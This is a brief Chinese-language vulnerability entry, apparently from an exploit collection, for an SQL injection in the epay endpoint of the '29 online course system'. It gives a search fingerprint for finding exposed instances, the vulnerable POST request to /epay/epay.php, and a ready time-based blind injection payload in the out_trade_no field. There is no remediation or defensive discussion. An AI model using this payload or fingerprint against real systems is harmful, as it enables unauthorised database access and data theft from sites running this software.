# 29网课系统epay存在SQL注入漏洞

29网课系统 ｜ SQL注入 ｜ —
- **指纹**：`body="你在看什么呢？我写的代码好看吗"`
- **请求**：`POST /epay/epay.php HTTP/1.1`

**Payload**
```
out_trade_no=' AND (SELECT 8078 FROM (SELECT(SLEEP(5)))eEcA) AND 'aEmC'='aEmC
```
- **响应特征**：200